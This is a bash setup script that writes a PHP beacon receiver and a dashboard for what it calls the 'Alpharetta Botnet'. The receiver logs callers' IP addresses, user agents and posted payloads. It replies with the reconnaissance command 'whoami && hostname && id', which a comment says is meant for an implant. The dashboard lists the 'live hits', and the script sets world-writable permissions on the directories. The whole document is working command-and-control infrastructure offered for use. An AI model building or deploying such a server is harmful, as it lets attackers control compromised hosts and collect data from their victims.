# Create directories & files
mkdir -p /var/www/beacon/logs /var/www/beacon/dashboard
chmod 777 /var/www/beacon/logs

# beacon receiver + logger (beacon.php)
cat > /var/www/beacon/index.php << 'EOF'
<?php
header('Content-Type: text/plain');
$log = '/var/www/beacon/logs/hits.log';
$time = date('Y-m-d H:i:s');
$ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
$ua = $_SERVER['HTTP_USER_AGENT'] ?? '-';
$payload = file_get_contents('php://input') ?: ($_REQUEST['q'] ?? 'empty');
$extra = $_SERVER['QUERY_STRING'] ?? '';

file_put_contents($log, "[$time] $ip - $ua - $payload - $extra\n", FILE_APPEND);

# Optional: echo command back to implant
echo "whoami && hostname && id";
EOF

# Simple dashboard (dashboard.php)
cat > /var/www/beacon/dashboard.php << 'EOF'
<!DOCTYPE html>
<html><head><title>SleepTheGod Dashboard @portknock</title>
<style>body{font-family:monospace;background:#000;color:#0f0;padding:20px;}
pre{background:#111;padding:10px;border:1px solid #0f0;}</style></head>
<body><h1>Alpharetta Botnet – Live Hits</h1>
<pre><?php
$log = '/var/www/beacon/logs/hits.log';
if (file_exists($log)) {
    echo nl2br(htmlspecialchars(file_get_contents($log)));
} else {
    echo "No hits yet...";
}
?></pre>
<a href="?refresh">Refresh</a> | <a href="/beacon">Test beacon</a></body></html>
EOF

# Make writable
chmod 666 /var/www/beacon/logs/hits.log
chown www-data:www-data /var/www/beacon/logs/hits.log
